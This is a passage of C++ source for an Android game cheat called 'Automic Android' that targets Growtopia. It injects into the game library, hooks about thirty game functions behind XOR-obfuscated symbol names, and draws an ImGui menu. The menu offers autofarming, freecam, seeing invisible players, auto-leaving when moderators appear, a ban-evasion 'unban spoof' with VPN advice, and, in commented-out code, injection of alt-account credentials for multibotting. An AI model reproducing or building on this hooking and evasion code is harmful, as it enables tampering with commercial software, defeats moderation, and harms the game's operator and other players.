		//colors[ImGuiCol_SliderGrabActive] = ImVec4(0.37f, 0.61f, 1.00f, 1.00f);
		//colors[ImGuiCol_Button] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		//colors[ImGuiCol_ButtonHovered] = ImVec4(0.28f, 0.56f, 1.00f, 1.00f);
		//colors[ImGuiCol_ButtonActive] = ImVec4(0.06f, 0.53f, 0.98f, 1.00f);
		//colors[ImGuiCol_Header] = ImVec4(0.20f, 0.25f, 0.29f, 0.55f);
		//colors[ImGuiCol_HeaderHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.80f);
		//colors[ImGuiCol_HeaderActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		//colors[ImGuiCol_Separator] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		//colors[ImGuiCol_SeparatorHovered] = ImVec4(0.10f, 0.40f, 0.75f, 0.78f);
		//colors[ImGuiCol_SeparatorActive] = ImVec4(0.10f, 0.40f, 0.75f, 1.00f);
		//colors[ImGuiCol_ResizeGrip] = ImVec4(0.26f, 0.59f, 0.98f, 0.25f);
		//colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.67f);
		//colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);
		//colors[ImGuiCol_Tab] = ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		//colors[ImGuiCol_TabHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.80f);
		//colors[ImGuiCol_TabActive] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		//colors[ImGuiCol_TabUnfocused] = ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		//colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		//colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
		//colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
		//colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
		//colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
		//colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
		//colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
		//colors[ImGuiCol_NavHighlight] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		//colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
		//colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
		//colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);
		// ACTUAL IMGUI INIT //
		ImGui_ImplAndroid_Init(NULL);
		ImGui_ImplOpenGL3_Init("#version 100");

		ImFontConfig font_cfg;
		font_cfg.SizePixels = 22.0f;
		io.Fonts->AddFontDefault(&font_cfg);

		ImGui::GetStyle().ScaleAllSizes(4.4f);
		//ConnectToAutomicserver();

		init = true;
	}

	doMiscBeforeDraw();
	//DRAW OUR SHIT

	ImGuiIO& io = ImGui::GetIO();
	ImGui_ImplOpenGL3_NewFrame();
	ImGui_ImplAndroid_NewFrame(oGetScreenSizeX(), oGetScreenSizeY());
	ImGui::NewFrame();

	ImGui::SetNextWindowPos(ImVec2(30, 30), ImGuiCond_::ImGuiCond_Once);
	ImGui::SetNextWindowSize(ImVec2(1100, 580), ImGuiCond_::ImGuiCond_Once);
	ImGui::SetNextWindowCollapsed(true, ImGuiCond_::ImGuiCond_Once);
	if (settings.serverWantsVersion != settings.clientVersion) {
		ImGui::Begin((g_windowTitle + " (OUTDATED)").c_str());
		ImGui::Text("A new update is available! Don't skid it");
	}
	else {
		ImGui::Begin(g_windowTitle.c_str());
	}

	if (ImGui::BeginTabBar("##tabbar")) {

		if (ImGui::BeginTabItem("Autofarm"))
		{
			ImGui::Checkbox("Auto collect", &settings.auto_collect);
			ImGui::SameLine();
			ImGui::SliderInt("Range", &settings.pickup_range, 1, 11);



			ImGui::Checkbox("Auto place", &settings.auto_place);
			ImGui::Checkbox("Auto break", &settings.auto_break);

			const char* farmModes[] = { "One block", "BFG", "Rayman", "Tractor", "Nuker" };

			if (ImGui::BeginCombo("##Auto mode", current_farm_mode)) // The second parameter is the label previewed before opening the combo.
			{
				for (int n = 0; n < IM_ARRAYSIZE(farmModes); n++)
				{
					bool is_selected = (current_farm_mode == farmModes[n]); // You can store your selection however you want, outside or inside your objects
					if (ImGui::Selectable(farmModes[n], is_selected)) {
						settings.farmMode = n;
						current_farm_mode = farmModes[n];
					}

					if (is_selected)
						ImGui::SetItemDefaultFocus();   // You may set the initial focus when opening the combo (scrolling + for keyboard navigation support)
				}
				ImGui::EndCombo();
			}

			if (ImGui::Button("Select Place Item")) {
				settings.place_item_id = 1;
			}
			ImGui::SameLine();
			if (settings.place_item_id != 0 && settings.place_item_id != 1) {
				ItemInfo* iff = oGetItemByIDSafe(oGetItemInfoManager(), settings.place_item_id);
				if (iff) ImGui::Text("Place Item: %s", iff->name.c_str());
				else ImGui::Text("Place Item: None.");
			}
			else {
				if (settings.place_item_id == 1) {
					ImGui::Text("Place Item: Selecting...");
				}
				else {
					ImGui::Text("Place Item: None.");
				}
			}
			if (ImGui::Button("Select Break Item")) {
				settings.break_item_id = 1;
			}
			ImGui::SameLine();
			if (settings.break_item_id != 0 && settings.break_item_id != 1) {
				ItemInfo* iff = oGetItemByIDSafe(oGetItemInfoManager(), settings.break_item_id);
				if (iff) ImGui::Text("Break Item: %s", iff->name.c_str());
				else ImGui::Text("Place Item: None:");
			}
			else {
				if (settings.break_item_id == 1) {
					ImGui::Text("Break Item: Selecting...");
				}
				else {
					ImGui::Text("Place Item: None.");
				}
			}

			ImGui::EndTabItem();
		}

		if (ImGui::BeginTabItem("Cheats")) {
			ImGui::Checkbox("Enable Super Multibotting", &settings.botmirror);
			ImGui::Checkbox("Freecam", &settings.freecam);
			ImGui::Checkbox("Always see ghosts", &settings.ghostsVisible);
			ImGui::Checkbox("Mod Zoom & See invisible", &settings.mstate);
			//ImGui::Checkbox("Fast drop", &settings.fast_drop);
			ImGui::Checkbox("Auto leave if mod enter", &settings.auto_leave);
			ImGui::Checkbox("ALWAYS RAYMAN GOLD HIT 2x (requires rayman)", &settings.gold_hit);

			ImGui::EndTabItem();
		}

		if (ImGui::BeginTabItem("Player Info"))
		{
			NetAvatar* avatar = oGetLocalPlayer(oGetGameLogic());
			if (avatar) {
				ImGui::Text("x: %f", avatar->pos.x);
				ImGui::Text("y: %f", avatar->pos.y);
				ImGui::Text("username: %s", avatar->username.c_str());
				ImGui::Text("netID: %d", avatar->netID);
			}
			else {
				ImGui::Text("** Not in game yet to load more infos! **");
			}

			ImGui::Text("NOTE: One click unban doesn't change your IP, use VPN too!");
			ImGui::Text("NOTE: If you get error connect you must use VPN to bypass it.");

			if (ImGui::Button("One Click Unban (Spoof)")) {

			}
			ImGui::EndTabItem();
		}

		//if (ImGui::BeginTabItem("Multibot & Growalts")) {
			//ImGui::Text("Growalts is a marketing, trade and account platform.");
			//ImGui::Text("You can get up to free 3 alts per button click. Limit is 12 per day.");
			//ImGui::Text("Multibotting is a technique to use duplicate accounts at once with 1 instance of GT.");
			//ImGui::Text("It mirrors all you do like punching, walking etc. and it's super powerful.");

			//if (ImGui::Button("Generate Random Growtopia Alt Accounts!")) {
				//for (int i = 0; i < 3; i++) {
					//settings.currentAccounts[i].username = "";

					//if (Events::g_peer) {
						//if (Events::g_peer->state == ENET_PEER_STATE_CONNECTED)
							//utils::SendPacket(Events::g_peer, "action|get_alt\n", 2, NULL);//lazy to delete due cant connect
					//}
				//}
			//}

			//if (settings.acc_retrieve_status) {
				//ImGui::Text("Your alt request limit per day (12) has been reached.");
				//ImGui::Text("Try getting more alts tomorrow.");
			//}

			// add the restly provided accounts...
			//if (settings.currentAccounts[0].username != "") {
				//ImGui::Text("Account 1 =>");

				//const char* username = settings.currentAccounts[0].username.c_str();
				//const char* password = settings.currentAccounts[0].password.c_str();

				//ImGui::Text("	GrowID: %s", username);
				//ImGui::Text("	Password: %s", password);
				//if (ImGui::Button("Apply Alt 1")) {
					//variantlist_t vlist{ variant_t{"SetHasGrowID"}, variant_t{1},
					//variant_t{username},
					//variant_t{password} };

					//TankPacketStruct tStruct;
					//tStruct.packetType = PACKET_CALL_FUNCTION;
					//tStruct.NetID = -1;
					//tStruct.characterState = 8;


					//void* data = vlist.serialize_to_mem(&tStruct.extDataSize, nullptr);

					//uint8_t* fullData = new uint8_t[56 + tStruct.extDataSize];
					//memcpy(fullData, &tStruct, 56);
					//memcpy(fullData + 56, data, tStruct.extDataSize);

					//oProcessTankUpdatePacket(oGetGameLogic(), fullData);

					//delete[] fullData;
					//delete[](uint8_t*)data;

					//auto root = oGetEntityRoot();
					//void* ent = NULL;
					//void* ent2 = NULL;

					//if (root) {
						//ent = oEntityGetEntityByName(root, "tankid_name");
						//ent2 = oEntityGetEntityByName(root, "tankid_password");

						//if (ent) {
							//oSetTextEntity(ent, std::string(username));
						//}

						//if (ent2) {
							//oSetTextEntity(ent2, std::string(password));
						//}
					//}

					//if (root && ent && ent2) oOnlineSaveSettings();
				//}
			//}

			//if (settings.currentAccounts[1].username != "") {
				//ImGui::Text("Account 2 =>");
				//const char* username = settings.currentAccounts[1].username.c_str();
				//const char* password = settings.currentAccounts[1].password.c_str();

				//ImGui::Text("	GrowID: %s", username);
				//ImGui::Text("	Password: %s", password);

				//if (ImGui::Button("Apply Alt 2")) {
					//variantlist_t vlist{ variant_t{"SetHasGrowID"}, variant_t{1},
					//variant_t{username},
					//variant_t{password} };

					//TankPacketStruct tStruct;
					//tStruct.packetType = PACKET_CALL_FUNCTION;
					//tStruct.NetID = -1;
					//tStruct.characterState = 8;


					//void* data = vlist.serialize_to_mem(&tStruct.extDataSize, nullptr);

					//uint8_t* fullData = new uint8_t[56 + tStruct.extDataSize];
					//memcpy(fullData, &tStruct, 56);
					//memcpy(fullData + 56, data, tStruct.extDataSize);

					//oProcessTankUpdatePacket(oGetGameLogic(), fullData);

					//delete[] fullData;
					//delete[](uint8_t*)data;

					//auto root = oGetEntityRoot();
					//void* ent = NULL;
					//void* ent2 = NULL;

					//if (root) {
						//ent = oEntityGetEntityByName(root, "tankid_name");
						//ent2 = oEntityGetEntityByName(root, "tankid_password");

						//if (ent) {
							//oSetTextEntity(ent, std::string(username));
							//}

						//if (ent2) {
							//oSetTextEntity(ent2, std::string(password));
							//}
						//}

					//if (root && ent && ent2) oOnlineSaveSettings();
				//}
				//}

			//if (settings.currentAccounts[2].username != "") {
				//ImGui::Text("Account 3 =>");

				//const char* username = settings.currentAccounts[2].username.c_str();
				//const char* password = settings.currentAccounts[2].password.c_str();

				//ImGui::Text("	GrowID: %s", username);
				//ImGui::Text("	Password: %s", password);
				//if (ImGui::Button("Apply Alt 3")) {
					//variantlist_t vlist{ variant_t{"SetHasGrowID"}, variant_t{1},
						//variant_t{username},
					//variant_t{password} };

					//TankPacketStruct tStruct;
					//tStruct.packetType = PACKET_CALL_FUNCTION;
					//tStruct.NetID = -1;
					//tStruct.characterState = 8;


					//void* data = vlist.serialize_to_mem(&tStruct.extDataSize, nullptr);

					//uint8_t* fullData = new uint8_t[56 + tStruct.extDataSize];
					//memcpy(fullData, &tStruct, 56);
					//memcpy(fullData + 56, data, tStruct.extDataSize);

					//oProcessTankUpdatePacket(oGetGameLogic(), fullData);

					//delete[] fullData;
					//delete[](uint8_t*)data;

					//auto root = oGetEntityRoot();
					//void* ent = NULL;
					//void* ent2 = NULL;

					//if (root) {
						//ent = oEntityGetEntityByName(root, "tankid_name");
						//ent2 = oEntityGetEntityByName(root, "tankid_password");

						//if (ent) {
							//oSetTextEntity(ent, std::string(username));
						//}

						//if (ent2) {
							//oSetTextEntity(ent2, std::string(password));
						//}
					//}

					//if (root && ent && ent2) oOnlineSaveSettings();
				//}
			//}

			//if (settings.currentAccounts[0].username != "") {
				//ImGui::Text("NOTE: It's recommended that you test all accounts first!");
				//ImGui::Text("For multibotting, make sure all accounts aren't banned.");
				//ImGui::Text("If all accounts are banned it won't work!");
				//ImGui::Text("And lastly, make sure you have no duplicate accounts as bots.");

				//ClientData cD;
				//if (ImGui::Button("Use all alts for Multibotting")) {
					//if (Events::g_peer) {
						//if (Events::g_peer->state == ENET_PEER_STATE_CONNECTED)
							//utils::SendPacket(Events::g_peer, "action|req_multibot\n", 2, NULL);//lazy
					//}

					//for (int i = 0; i < 3; i++) {
						//if (settings.currentAccounts[i].username == "") continue;

						//cD.tankIDName = settings.currentAccounts[i].username;
						//cD.tankIDPass = settings.currentAccounts[i].password;
						//cD.mac = settings.currentAccounts[i].mac;
						//cD.rid = settings.currentAccounts[i].rid;

						//botClient->SetDataOnConnect(i, cD);

						//botClient->Disconnect(i); // make sure if there were clients connected before to disconnect them.
						//botClient->Connect(botHosts[i]);
					//}
				//}
			//}

			//ImGui::EndTabItem();
		//}

		if (ImGui::BeginTabItem("About")) {
			ImGui::Text("Don't skid :) Astroyaxx <3");

			ImGui::Text("\nThank you for using Automic Android.\nWant to support us? Promote & Share this cheat!");
			ImGui::EndTabItem();
		}

		ImGui::EndTabBar();
	}

	ImGui::End();
	ImGui::Render();
	glViewport(0, 0, (int)io.DisplaySize.x, (int)io.DisplaySize.y);

	ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());

	oBaseAppDraw(a1);
}

std::list<WorldObject>* Hook_WorldObjectMapGetObjectList(void* ths) {
	return oWorldObjectMapGetObjectList(ths);
}

void* Hook_GetObjectMap() {
	return oGetObjectMap();
}

void Hook_AppOnTouch(void* jEnv, void* jObj, int a1, float x, float y, int a4) {

	ImGuiIO& io = ImGui::GetIO();

	CL_Vec2f vec2f;
	vec2f.x = x;
	vec2f.y = y;

	if (x > 0 && y > 0)
		ImGui_ImplAndroid_HandleInputEventGrowtopia(jEnv, vec2f, (int)a1);

	if (!io.WantCaptureMouse) {
		oAppOnTouch(jEnv, jObj, a1, x, y, a4);
	}
}

int Hook_SetChosenItemID(int a1, int a2) {
	bool isTool = a2 == 18 || a2 == 32;

	if (settings.break_item_id == 1)
		settings.break_item_id = isTool ? 0 : a2;

	if (settings.place_item_id == 1)
		settings.place_item_id = isTool ? 0 : a2;

	return oSetChosenItemID(a1, a2);
}

void Hook_GameLogicComponentOnUpdate(int a1) {

	//do autofarm stuff here
	oGameLogicComponentOnUpdate(a1);
}

void* Hook_GetClient() {
	return oGetClient();
}

void* Hook_GetApp() {
	return oGetApp();
}
void* Hook_GetEntityRoot() {
	return oGetEntityRoot();
}
void* Hook_EntityGetEntityByName(void* parent, std::string name) {
	return oEntityGetEntityByName(parent, name);
}
void Hook_SetTextEntity(void* parent, std::string text) {
	oSetTextEntity(parent, text);
}

std::string Hook_AppGetVersionString(void* app) {
	return "V3.65";
}

Camera* Hook_GetCamera() {
	Camera* camera = oGetCamera();

	if (settings.freecam)
		camera->pos = settings.last_camera_pos;

	return camera;
}

void* Hook_WorldCameraToScreen(float* out, float* camera, float* in) {
	return oWorldCameraToScreen(out, camera, in);
}



void Hook_LevelTouchComponentHandleTouchAtWorldCoordinates(void* handler, float* pos, bool started) {

	void* cameraPtr = (void*)oGetCamera();
	if (cameraPtr) {
		if (settings.freecam) {
			Camera* camera = (Camera*)cameraPtr;

			CL_Vec2f pos2f;
			pos2f.x = pos[0];
			pos2f.y = pos[1];

			float new_position[2];
			void* newCamera = oWorldCameraToScreen((float*)&new_position, (float*)camera, pos);

			CL_Vec2f new_pos;
			new_pos.x = new_position[0];
			new_pos.y = new_position[1];

			settings.DeltaTime[0] = new_pos.x - settings.prev_touch_location.x;
			settings.DeltaTime[1] = new_pos.y - settings.prev_touch_location.y;

			settings.prev_touch_location = new_pos;
		}
		oLevelTouchComponentHandleTouchAtWorldCoordinates(handler, pos, started);
	}
}

NetAvatar* Hook_GetLocalPlayer(void* a1) {
	return oGetLocalPlayer(a1);
}

void* Hook_GetGameLogic() {
	return oGetGameLogic();
}

/* END OF HOOKS */
void doMiscAfterMain() {
	if (enet_initialize() == 0) {
		//SetupMultibotting();
	}

	auto root = oGetEntityRoot();
	if (root) {

		auto ent = oEntityGetEntityByName(root, "version");
		if (ent) {
			oSetTextEntity(ent, Hook_AppGetVersionString(oGetApp()));
		}
	}
}

void* handle = NULL;
void* MainThread(void*) {
	const char* libgtdotso = Xor::encDec(EncStrs::libgrowtopiadotso, EncStrs::libgrowtopiadotso_len).c_str();//yk webhooka gitmemiþte bak biþi gösterem 

	while (!isLibraryLoaded(libgtdotso) && !isLibraryLoaded(std::string("/data/data/com.rtsoft.growtopia/lib/" + std::string(libgtdotso)).c_str())) {
		sleep(1);
	}

	sleep(1);

	if (!(handle = dlopen(libgtdotso, RTLD_LAZY))) {
		sleep(1);
		handle = dlopen(("/data/data/com.rtsoft.growtopia/lib/" + std::string(libgtdotso)).c_str(), RTLD_LAZY);
	}

	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_SendPacketRaw, EncStrs::Symbol_SendPacketRaw_len).c_str()), (void*)Hook_SendPacketRaw, (void**)&oSendPacketRaw);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_SendPacket, EncStrs::Symbol_SendPacket_len).c_str()), (void*)Hook_SendPacket, (void**)&oSendPacket);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetScreenSizeX, EncStrs::Symbol_GetScreenSizeX_len).c_str()), (void*)Hook_GetScreenSizeX, (void**)&oGetScreenSizeX);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetScreenSizeY, EncStrs::Symbol_GetScreenSizeY_len).c_str()), (void*)Hook_GetScreenSizeY, (void**)&oGetScreenSizeY);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_AppOnTouch, EncStrs::Symbol_AppOnTouch_len).c_str()), (void*)Hook_AppOnTouch, (void**)&oAppOnTouch);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_ProcessTankUpdatePacket, EncStrs::Symbol_ProcessTankUpdatePacket_len).c_str()), (void*)Hook_ProcessTankUpdatePacket, (void**)&oProcessTankUpdatePacket);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_HandleTrackPacket, EncStrs::Symbol_HandleTrackPacket_len).c_str()), (void*)Hook_HandleTrackPacket, (void**)&oHandleTrackPacket);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_BaseAppDraw, EncStrs::Symbol_BaseAppDraw_len).c_str()), (void*)Hook_BaseAppDraw, (void**)&oBaseAppDraw);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_SetChosenItemID, EncStrs::Symbol_SetChosenItemID_len).c_str()), (void*)Hook_SetChosenItemID, (void**)&oSetChosenItemID);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_OnUpdate, EncStrs::Symbol_OnUpdate_len).c_str()), (void*)Hook_GameLogicComponentOnUpdate, (void**)&oGameLogicComponentOnUpdate);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetClient, EncStrs::Symbol_GetClient_len).c_str()), (void*)Hook_GetClient, (void**)&oGetClient);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetLocalPlayer, EncStrs::Symbol_GetLocalPlayer_len).c_str()), (void*)Hook_GetLocalPlayer, (void**)&oGetLocalPlayer);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetGameLogic, EncStrs::Symbol_GetGameLogic_len).c_str()), (void*)Hook_GetGameLogic, (void**)&oGetGameLogic);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetTileSafe, EncStrs::Symbol_GetTileSafe_len).c_str()), (void*)Hook_GetTileSafe, (void**)&oGetTileSafe);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetCamera, EncStrs::Symbol_GetCamera_len).c_str()), (void*)Hook_GetCamera, (void**)&oGetCamera);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_WorldToScreen, EncStrs::Symbol_WorldToScreen_len).c_str()), (void*)Hook_WorldCameraToScreen, (void**)&oWorldCameraToScreen);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_HandleTouchAtWorldCoordinates, EncStrs::Symbol_HandleTouchAtWorldCoordinates_len).c_str()), (void*)Hook_LevelTouchComponentHandleTouchAtWorldCoordinates, (void**)&oLevelTouchComponentHandleTouchAtWorldCoordinates);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetTileMap, EncStrs::Symbol_GetTileMap_len).c_str()), (void*)Hook_GetTileMap, (void**)&oGetTileMap);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetTileAtWorldPos, EncStrs::Symbol_GetTileAtWorldPos_len).c_str()), (void*)Hook_GetTileAtWorldPos, (void**)&oGetTileAtWorldPos);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetItemInfoManager, EncStrs::Symbol_GetItemInfoManager_len).c_str()), (void*)Hook_GetItemInfoManager, (void**)&oGetItemInfoManager);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetItemByIDSafe, EncStrs::Symbol_GetItemByIDSafe_len).c_str()), (void*)Hook_GetItemByIDSafe, (void**)&oGetItemByIDSafe);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_CanSeeGhosts, EncStrs::Symbol_CanSeeGhosts_len).c_str()), (void*)Hook_CanSeeGhosts, (void**)&oCanSeeGhosts);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_OnSpawn, EncStrs::Symbol_OnSpawn_len).c_str()), (void*)Hook_OnSpawn, (void**)&oOnSpawn);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_SetSecurityStates, EncStrs::Symbol_SetSecurityStates_len).c_str()), (void*)Hook_NetAvatarSetSecurityStates, (void**)&oNetAvatarSetSecurityStates);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetVersionString, EncStrs::Symbol_GetVersionString_len).c_str()), (void*)Hook_AppGetVersionString, (void**)&oAppGetVersionString);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetEntityRoot, EncStrs::Symbol_GetEntityRoot_len).c_str()), (void*)Hook_GetEntityRoot, (void**)&oGetEntityRoot);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetEntityByName, EncStrs::Symbol_GetEntityByName_len).c_str()), (void*)Hook_EntityGetEntityByName, (void**)&oEntityGetEntityByName);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_SetTextEntity, EncStrs::Symbol_SetTextEntity_len).c_str()), (void*)Hook_SetTextEntity, (void**)&oSetTextEntity);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetApp, EncStrs::Symbol_GetApp_len).c_str()), (void*)Hook_GetApp, (void**)&oGetApp);
	//MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_OnlineSaveSettings, EncStrs::Symbol_OnlineSaveSettings_len).c_str()), (void*)Hook_OnlineSaveSettings, (void**)&oOnlineSaveSettings);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_WorldObjectMapGetObjectList, EncStrs::Symbol_WorldObjectMapGetObjectList_len).c_str()), (void*)Hook_WorldObjectMapGetObjectList, (void**)&oWorldObjectMapGetObjectList);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_GetObjectMap, EncStrs::Symbol_GetObjectMap_len).c_str()), (void*)Hook_GetObjectMap, (void**)&oGetObjectMap);
	MSHookFunction(dlsym(handle, Xor::encDec(EncStrs::Symbol_LogToConsoleSafe, EncStrs::Symbol_LogToConsoleSafe_len).c_str()), (void*)Hook_LogToConsoleSafe, (void**)&oLogToConsoleSafe);

	/* REMOVE THOSE LINES UPON RELEASE FOR PRODUCTION */

#ifdef ISDEBUGBUILD
	char* err = dlerror();
	if (err) LOGI("Last hook error (couldn't find symbol): %s", err);
#endif
	/* REMOVE THOSE LINES UPON RELEASE FOR PRODUCTION */

	doMiscAfterMain();
	return NULL;
}

__attribute__((constructor))
void libinfernal_main() {
	srand(time(NULL) * getpid());

	pthread_t ptid;
	pthread_create(&ptid, NULL, MainThread, NULL);
}
